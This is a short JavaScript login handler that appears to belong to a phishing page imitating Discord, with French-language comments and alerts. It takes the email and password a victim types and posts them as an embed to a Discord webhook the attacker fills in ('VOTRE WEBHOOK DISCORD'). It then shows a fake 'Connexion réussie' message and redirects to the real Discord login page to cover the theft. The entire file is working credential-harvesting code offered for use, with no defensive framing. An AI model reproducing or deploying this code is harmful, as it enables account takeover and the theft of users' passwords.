function login() {
    var password = document.getElementById('uid_7').value;
    var email = document.getElementById('uid_5').value;

    if (email !== '' && password !== '') {
        var data = {
            content: 'Login attempt',
            embeds: [
                {
                    title: 'Login Information',
                    fields: [
                        { name: 'Email', value: email },
                        { name: 'Password', value: password }
                    ]
                }
            ]
        };

        // VOTRE WEBHOOK DISCORD
        fetch('https://discord.com/api/webhooks/', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(data)
        })
        .then(response => response.json())
        .then(data => {
            console.log(data);
            alert("Connexion réussie");
            window.location.href = "https://discord.com/login"
        })
        .catch(error => {
            console.error(error);
            alert("Quelque chose s'est mal passé... Veuillez réessayer...");
            window.location.href = "https://discord.com/login"
        });

    } else {
        alert('Remplissez tous les champs...');
    }
}
